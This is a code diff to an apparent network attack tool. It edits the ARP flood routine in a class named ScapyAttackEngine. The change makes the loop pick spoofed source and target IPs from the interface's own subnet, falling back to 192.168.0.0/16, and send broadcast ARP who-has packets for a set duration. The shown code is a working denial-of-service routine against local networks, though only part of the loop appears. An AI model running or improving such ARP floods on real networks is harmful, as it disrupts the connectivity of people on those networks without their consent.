@@ -8,6 +8,7 @@ import subprocess
 import sys
 import time
 from typing import ClassVar
+from ipaddress import ip_network
 
 from scapy.all import (
     ARP,
@@ -26,6 +27,7 @@ from scapy.all import (
     Ether,
     RadioTap,
     conf,
+    get_if_addr,
     get_if_hwaddr,
     send,
     sendp,
@@ -978,9 +980,32 @@ class ScapyAttackEngine(AttackEngine):
         try:
             iface = conf.iface
             my_mac = get_if_hwaddr(iface)
+            network = None
+
+            try:
+                iface_ip = get_if_addr(iface)
+                from scapy.arch.common import get_if_netmask
+
+                netmask = get_if_netmask(iface)
+                if iface_ip:
+                    network = ip_network(f"{iface_ip}/{netmask}", strict=False)
+            except Exception as e:
+                logger.debug(f"[ScapyEngine] Could not derive subnet: {e}")
+
+            if network is None:
+                # Fallback to private /16 to keep ARP flood local
+                network = ip_network("192.168.0.0/16")
+
             import random
 
             end_time = time.time() + duration
+
+            def random_ip_in_network(net):
+                if net.num_addresses <= 2:
+                    return str(net.network_address)
+                max_offset = net.num_addresses - 2
+                offset = random.randint(1, max_offset)
+                return str(net.network_address + offset)
 
             while time.time() < end_time:
                 if not self._running_attacks.get(target_mac):
@@ -990,8 +1015,8 @@ class ScapyAttackEngine(AttackEngine):
                     break
 
                 # Generate random IP addresses
-                fake_ip = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
-                target_ip = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
+                fake_ip = random_ip_in_network(network)
+                target_ip = random_ip_in_network(network)
 
                 # Send ARP who-has request
                 arp_request = Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac) / ARP(
